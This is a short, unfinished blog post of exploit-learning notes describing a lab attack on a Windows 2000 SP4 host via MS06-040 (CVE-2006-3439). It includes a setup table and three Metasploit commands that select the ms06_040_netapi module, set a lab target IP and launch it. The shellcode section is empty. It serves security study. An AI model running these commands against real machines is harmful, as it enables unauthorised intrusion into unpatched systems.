---
title: Exploit Learning Notes 005 Metasploit Make ShellCode
description: Metasploit crafting ShellCode
date: 2020-10-20 22:20:00+0800
categories:
    - Exploit
tags:
    - Windows
    - ShellCode
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-005-metasploit-make-shellcode/)

... Unfinished business (Metasploit old version is really hard to find) ...

## Intrusion into Windows experiment

### Introduction to the experiment

> MS06-040, CVE-2006-3439

| Recommended Environment | Remarks |
|-|-|-|
| Attacking machine system | Kali Linux 2021.1 | |
| Target host system | Windows 2000 SP4 | |
| Patch version | KB921883 | Make sure the target host does not have the patch installed |
| network environment | can ping each other | ensure no firewall interference |

### Command line interface vulnerability testing

- `use exploit/windows/smb/ms06_040_netapi`
- `set rhosts 10.211.55.5`
- `exploit`

## Make ShellCode with MetaSploit

... To be continued...
